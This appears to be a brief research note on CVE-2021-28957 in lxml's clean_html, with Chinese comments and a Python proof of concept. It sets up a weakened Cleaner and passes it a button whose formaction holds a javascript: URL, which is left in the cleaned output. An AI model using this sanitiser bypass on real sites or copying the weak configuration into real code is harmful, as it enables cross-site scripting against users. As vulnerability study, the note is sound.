https://nvd.nist.gov/vuln/detail/cve-2021-28957

tpl:
lxml

vul func:
clean_html


禁用 safe_attrs_only 和 forms 参数




from lxml.html.clean import Cleaner

# 漏洞配置
vulnerable_cleaner = Cleaner(
    safe_attrs_only=False,
    forms=True,
    javascript=False,  # 看似禁用JS，但formaction可绕过
    style=False
)

malicious_html = '''
<button formaction="javascript:alert('XSS')">Click me</button>
<form id="test"></form>
'''

# 清理后的HTML仍包含恶意属性
cleaned = vulnerable_cleaner.clean_html(malicious_html)
print(cleaned)  # 输出中会保留 formaction="javascript:..."
